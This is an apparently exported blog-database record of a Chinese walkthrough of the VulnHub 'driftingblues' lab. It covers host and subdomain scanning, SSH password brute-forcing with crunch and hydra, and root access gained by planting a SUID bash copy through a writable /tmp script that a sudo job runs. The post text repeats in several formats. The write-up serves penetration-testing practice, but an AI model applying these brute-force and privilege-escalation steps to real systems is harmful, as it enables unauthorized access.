2>/dev/null\n```\n\n看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方\n\n在备份目录下有个backup.sh，看一下内容\n\n![](https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png)\n\n有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权\n\n思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了\n\n```\necho 'cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot' > /tmp/emergency\n#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限\nchmod +x emergency\n./getroot -p\n```\n\n![](https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png)\n\n![](https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png)\n\n现在可以获取第二个flag了\n\n<img src=\"https://i.loli.net/2021/10/12/bWHGwDhZx1cTntf.png\" style=\"zoom:67%;\" />\n\n> 参考：\n>\n> https://blog.csdn.net/weixin_45922278/article/details/115277255\n","slug":"driftingblues-VulnHub-Walkthrough","published":1,"updated":"2021-10-12T08:29:04.751Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckupad5ty000bwsvth3b2fvrv","content":"<h2 id=\"driftingblues-VulnHub-Walkthrough\"><a href=\"#driftingblues-VulnHub-Walkthrough\" class=\"headerlink\" title=\"driftingblues VulnHub Walkthrough\"></a>driftingblues VulnHub Walkthrough</h2><h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"主机探测\"><a href=\"#主机探测\" class=\"headerlink\" title=\"主机探测\"></a>主机探测</h4><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png\"></p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.172\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png\"></p>\n<p>只开放了22和80端口，只能先访问80端口看一下有没有什么信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png\"></p>\n<p>好像没什么东西，扫了目录也没什么信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/89FHODkPsiIKq3A.png\"></p>\n<p>右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径</p>\n<p><img src=\"https://i.loli.net/2021/10/12/F4z37IMB6HRTbN8.png\"></p>\n<p>访问一下，这个很明显了，到在线的ook!解密网站解密一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/f3Y5qmlHkdy4UO2.png\"></p>\n<p>是一个提示，应该是要修改host文件</p>\n<p><img src=\"https://i.loli.net/2021/10/12/2A8K7SIUoW3ZYCJ.png\"></p>\n<p>在主页上可以看到一个域名，尝试添加到host再访问</p>\n<p><img src=\"https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png\"></p>\n<p>重新扫目录还是没有发现，那就试试爆破子域名</p>\n<pre><code>wfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H &quot;Host:FUZZ.driftingblues.box&quot; --hw 570\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png\"></p>\n<p>直接访问解析不了，需要再修改一下host</p>\n<p><img src=\"https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png\"></p>\n<p>访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/rQZJMdo6itON41X.png\"></p>\n<p>再扫一次目录，发现有robots.txt</p>\n<p><img src=\"https://i.loli.net/2021/10/12/h8NRS47k5FwcyQP.png\"></p>\n<p>访问一下，看到给了一些路径</p>\n<p><img src=\"https://i.loli.net/2021/10/12/hqH8zidLMpy2B4b.png\"></p>\n<p>查看ssh_cred.txt，给了提示</p>\n<p><img src=\"https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png\"></p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>ssh登录的密码是<code>1mw4ckyyucky*</code>，目前还缺一位数字，一共十个可能的密码，先生成一下</p>\n<pre><code>crunch 13 13 -t 1mw4ckyyucky% &gt; pass\n</code></pre>\n<p>看一下我们生成的密码集合</p>\n<p><img src=\"https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png\"></p>\n<p>接下来尝试爆破ssh登录密码，根据前面访问<code>test.driftingblues.box</code>的提示，用户名应该是<code>eric</code></p>\n<pre><code>hydra -l eric -P pass ssh://192.168.62.172\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png\"></p>\n<p>找到密码了，直接登录ssh</p>\n<p><img src=\"https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png\"></p>\n<p>直接获取第一个flag</p>\n<img src=\"https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png\" style=\"zoom:67%;\" />\n\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><pre><code>uname -a\nfind / -perm -u=s -type f 2&gt;/dev/null\ngetcap -r  / 2&gt;/dev/null\n</code></pre>\n<p>看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方</p>\n<p>在备份目录下有个backup.sh，看一下内容</p>\n<p><img src=\"https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png\"></p>\n<p>有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权</p>\n<p>思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了</p>\n<pre><code>echo &#39;cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot&#39; &gt; /tmp/emergency\n#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限\nchmod +x emergency\n./getroot -p\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png\"></p>\n<p>现在可以获取第二个flag了</p>\n<img src=\"https://i.loli.net/2021/10/12/bWHGwDhZx1cTntf.png\" style=\"zoom:67%;\" />\n\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/weixin_45922278/article/details/115277255\">https://blog.csdn.net/weixin_45922278/article/details/115277255</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"driftingblues-VulnHub-Walkthrough\"><a href=\"#driftingblues-VulnHub-Walkthrough\" class=\"headerlink\" title=\"driftingblues VulnHub Walkthrough\"></a>driftingblues VulnHub Walkthrough</h2><h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"主机探测\"><a href=\"#主机探测\" class=\"headerlink\" title=\"主机探测\"></a>主机探测</h4><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png\"></p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.172\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png\"></p>\n<p>只开放了22和80端口，只能先访问80端口看一下有没有什么信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png\"></p>\n<p>好像没什么东西，扫了目录也没什么信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/89FHODkPsiIKq3A.png\"></p>\n<p>右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径</p>\n<p><img src=\"https://i.loli.net/2021/10/12/F4z37IMB6HRTbN8.png\"></p>\n<p>访问一下，这个很明显了，到在线的ook!解密网站解密一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/f3Y5qmlHkdy4UO2.png\"></p>\n<p>是一个提示，应该是要修改host文件</p>\n<p><img src=\"https://i.loli.net/2021/10/12/2A8K7SIUoW3ZYCJ.png\"></p>\n<p>在主页上可以看到一个域名，尝试添加到host再访问</p>\n<p><img src=\"https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png\"></p>\n<p>重新扫目录还是没有发现，那就试试爆破子域名</p>\n<pre><code>wfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H &quot;Host:FUZZ.driftingblues.box&quot; --hw 570\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png\"></p>\n<p>直接访问解析不了，需要再修改一下host</p>\n<p><img src=\"https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png\"></p>\n<p>访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/rQZJMdo6itON41X.png\"></p>\n<p>再扫一次目录，发现有robots.txt</p>\n<p><img src=\"https://i.loli.net/2021/10/12/h8NRS47k5FwcyQP.png\"></p>\n<p>访问一下，看到给了一些路径</p>\n<p><img src=\"https://i.loli.net/2021/10/12/hqH8zidLMpy2B4b.png\"></p>\n<p>查看ssh_cred.txt，给了提示</p>\n<p><img src=\"https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png\"></p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>ssh登录的密码是<code>1mw4ckyyucky*</code>，目前还缺一位数字，一共十个可能的密码，先生成一下</p>\n<pre><code>crunch 13 13 -t 1mw4ckyyucky% &gt; pass\n</code></pre>\n<p>看一下我们生成的密码集合</p>\n<p><img src=\"https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png\"></p>\n<p>接下来尝试爆破ssh登录密码，根据前面访问<code>test.driftingblues.box</code>的提示，用户名应该是<code>eric</code></p>\n<pre><code>hydra -l eric -P pass ssh://192.168.62.172\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png\"></p>\n<p>找到密码了，直接登录ssh</p>\n<p><img src=\"https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png\"></p>\n<p>直接获取第一个flag</p>\n<img src=\"https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png\" style=\"zoom:67%;\" />\n\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><pre><code>uname -a\nfind / -perm -u=s -type f 2&gt;/dev/null\ngetcap -r  / 2&gt;/dev/null\n</code></pre>\n<p>看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方</p>\n<p>在备份目录下有个backup.sh，看一下内容</p>\n<p><img src=\"https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png\"></p>\n<p>有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权</p>\n<p>思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了</p>\n<pre><code>echo &#39;cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot&#39; &gt; /tmp/emergency\n#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限\nchmod +x emergency\n./getroot -p\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png\"></p>\n<p>现在可以获取第二个flag了</p>\n<img src=\"https://i.loli.net/2021/10/12/bWHGwDhZx1cTntf.png\" style=\"zoom:67%;\" />\n\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/weixin_45922278/article/details/115277255\">https://blog.csdn.net/weixin_45922278/article/details/115277255</a></p>\n</blockquote>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ckupad5tu0006wsvtdwaj3crl","category_id":"ckupad5tr0003wsvt6nrybjgt","_id":"ckupad5tz000dwsvt7mei8t4i"},{"post_id":"ckupad5tm0001wsvt7v6z61bh","category_id":"ckupad5tr0003wsvt6nrybjgt","_id":"ckupad5u0000hwsvt8sxl44mx"},{"post_id":"ckupad5tv0007wsvt2hkj0qxy","category_id":"ckupad5tr0003wsvt6nrybjgt","_id":"ckupad5u1000iwsvt2qs9hgw8"},{"post_id":"ckupad5ty000bwsvth3b2fvrv","category_id":"ckupad5tr0003wsvt6nrybjgt","_id":"ckupad5u1000lwsvt41ml9rr0"},{"post_id":"ckupad5tp0002wsvtgs9q4vb6","category_id":"ckupad5tr0003wsvt6nrybjgt","_id":"ckupad5u1000mwsvt50l55jiu"},{"post_id":"ckupad5tt0005wsvt7x4p1q7t","category_id":"ckupad5tr0003wsvt6nrybjgt","_id":"ckupad5u2000owsvtc92rhnpx"}],"PostTag":[{"post_id":"ckupad5tu0006wsvtdwaj3crl","tag_id":"ckupad5ts0004wsvtg2utdkic","_id":"ckupad5ty000awsvthjx5cs60"},{"post_id":"ckupad5tm0001wsvt7v6z61bh","tag_id":"ckupad5ts0004wsvtg2utdkic","_id":"ckupad5tz000cwsvt1y5gbv2w"},{"post_id":"ckupad5tp0002wsvtgs9q4vb6","tag_id":"ckupad5ts0004wsvtg2utdkic","_id":"ckupad5u0000gwsvt7j345o14"},{"post_id":"ckupad5tt0005wsvt7x4p1q7t","tag_id":"ckupad5ts0004wsvtg2utdkic","_id":"ckupad5u1000kwsvt75hh0gso"},{"post_id":"ckupad5tv0007wsvt2hkj0qxy","tag_id":"ckupad5u1000jwsvtf8iygye5","_id":"ckupad5u2000pwsvt385u8h6f"},{"post_id":"ckupad5ty000bwsvth3b2fvrv","tag_id":"ckupad5u1000jwsvtf8iygye5","_id":"ckupad5u2000qwsvt6ok24c83"}],"Tag":[{"name":"HackTheBox","_id":"ckupad5ts0004wsvtg2utdkic"},{"name":"VulnHub","_id":"ckupad5u1000jwsvtf8iygye5"}]}}